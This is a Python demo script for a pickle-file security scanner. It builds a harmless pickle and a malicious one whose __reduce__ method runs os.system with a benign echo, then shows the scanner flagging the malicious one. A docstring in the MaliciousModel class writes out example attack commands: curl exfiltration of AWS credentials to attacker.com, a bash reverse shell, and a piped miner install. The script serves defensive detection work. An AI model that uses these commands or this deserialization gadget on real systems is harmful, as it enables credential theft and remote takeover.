#!/usr/bin/env python3
"""
Pickle RCE Detection Demo
==========================

Demonstrates how Sentinel detects __reduce__-based arbitrary code execution
in pickle files — the #1 model serialization attack vector.

Flow:
1. Create a safe pickle (normal dict)
2. Create a malicious pickle (__reduce__ → os.system)
3. Scan both with PickleScanner
4. Compare results: safe = clean, malicious = CRITICAL findings

This is equivalent to the real-world attack where an attacker replaces
a model checkpoint on HuggingFace with a backdoored pickle.
"""

import io
import os
import pickle
import struct
import sys
import tempfile

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "python"))

from sentinel.artifact.pickle_scanner import PickleScanner


# ─── Step 1: Create a SAFE pickle ────────────────────────────────

def create_safe_pickle() -> bytes:
    """Create a normal, harmless pickle containing model weights."""
    safe_data = {
        "model_name": "sentiment-classifier-v1",
        "version": "1.0.0",
        "weights": {
            "layer1.weight": [0.1, 0.2, 0.3, 0.4],
            "layer1.bias": [0.01, 0.02],
            "layer2.weight": [0.5, 0.6],
            "layer2.bias": [0.03],
        },
        "config": {
            "input_dim": 768,
            "hidden_dim": 256,
            "output_dim": 2,
        },
    }
    return pickle.dumps(safe_data, protocol=4)


# ─── Step 2: Create a MALICIOUS pickle ───────────────────────────

class MaliciousModel:
    """
    Simulates a backdoored model that executes os.system on deserialization.

    In the real world, an attacker would use this __reduce__ method to:
    - Exfiltrate AWS credentials: os.system("curl attacker.com/$(cat ~/.aws/credentials)")
    - Install a reverse shell: os.system("bash -i >& /dev/tcp/attacker/4444 0>&1")
    - Mine crypto: os.system("curl miner.sh | bash")

    For this demo, we use a harmless command.
    """

    def __reduce__(self):
        return (os.system, ("echo 'SENTINEL DEMO: This would be malicious'",))


def create_malicious_pickle() -> bytes:
    """Create a pickle that executes os.system on load."""
    return pickle.dumps(MaliciousModel(), protocol=4)


# ─── Step 3: Scan and compare ────────────────────────────────────

def main():
    scanner = PickleScanner()

    print("=" * 60)
    print("  Eresus Sentinel — Pickle RCE Detection Demo")
    print("=" * 60)

    # Safe pickle scan
    print("\n[1/2] Scanning SAFE pickle (normal model weights)...")
    safe_data = create_safe_pickle()
    safe_findings = scanner.scan_bytes(safe_data, source="safe_model.pkl")

    critical_safe = [f for f in safe_findings if f.severity.value == "critical"]
    print(f"  → Total findings: {len(safe_findings)}")
    print(f"  → Critical findings: {len(critical_safe)}")
    if not critical_safe:
        print("  ✅ No critical issues — safe pickle is clean!")

    # Malicious pickle scan
    print("\n[2/2] Scanning MALICIOUS pickle (__reduce__ → os.system)...")
    mal_data = create_malicious_pickle()
    mal_findings = scanner.scan_bytes(mal_data, source="malicious_model.pkl")

    critical_mal = [f for f in mal_findings if f.severity.value == "critical"]
    print(f"  → Total findings: {len(mal_findings)}")
    print(f"  → Critical findings: {len(critical_mal)}")

    if critical_mal:
        print("  🚨 CRITICAL issues detected!")
        for f in critical_mal:
            print(f"\n  [{f.rule_id}] {f.title}")
            print(f"  Confidence: {f.confidence}")
            print(f"  Evidence: {f.evidence[:120]}")

    # Summary
    print("\n" + "=" * 60)
    print("  Summary")
    print("=" * 60)
    print(f"  Safe pickle:      {len(critical_safe)} critical findings")
    print(f"  Malicious pickle: {len(critical_mal)} critical findings")

    if len(critical_mal) > 0 and len(critical_safe) == 0:
        print("\n  ✅ Scanner correctly identified the malicious pickle!")
        print("     Detection: GLOBAL→REDUCE chain confirmation")
    else:
        print("\n  ⚠️  Review scanner output above")

    # Detailed report
    print("\n" + "-" * 60)
    print("  Full Findings for Malicious Pickle:")
    print("-" * 60)
    for i, f in enumerate(mal_findings, 1):
        print(f"\n  [{i}] {f.rule_id}: {f.title}")
        print(f"      Severity: {f.severity.value.upper()}")
        print(f"      Confidence: {f.confidence}")
        if f.evidence:
            print(f"      Evidence: {f.evidence[:200]}")


if __name__ == "__main__":
    main()
